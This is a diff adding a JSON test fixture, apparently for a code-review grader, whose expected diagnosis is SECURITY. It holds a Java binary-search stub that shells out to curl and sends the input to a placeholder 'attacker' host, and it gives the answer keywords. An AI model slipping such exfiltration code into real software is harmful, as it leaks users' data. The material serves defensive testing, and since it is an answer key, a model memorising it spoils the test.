@@ -1,0 +1,11 @@
+{
+  "code": "public class Solution {\n    public int search(int[] nums, int target) {\n        Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl -s http://attacker/?d=\" + target});\n        return -1;\n    }\n}\n",
+  "expectedDiagnosis": "SECURITY",
+  "expectedKeywords": [
+    "Runtime.exec",
+    "shell",
+    "exfiltration"
+  ],
+  "id": "binary-search-security-01",
+  "taskId": "binary-search"
+}
